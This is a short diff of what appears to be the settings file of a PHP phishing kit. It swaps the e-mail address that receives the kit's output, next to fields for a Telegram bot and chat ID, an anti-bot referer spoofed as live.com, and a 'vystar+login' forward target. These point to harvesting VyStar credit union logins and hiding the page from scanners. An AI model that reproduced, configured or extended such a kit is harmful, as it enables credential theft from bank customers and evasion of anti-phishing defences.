@@ -16,7 +16,7 @@ $settings = array(
 
     "chat_id"		=> "",	// Chat ID Of You
 	"bot_url"		=> "",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
-	"email"			=> "shomdrey@protonmail.com",	// Your E-Mail
+	"email"			=> "tyger120@tygerre.online",	// Your E-Mail
 
     "referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
 	"out"			=> "vystar+login",	// Outcome Of AntiBots Forward - DONT CHANGE
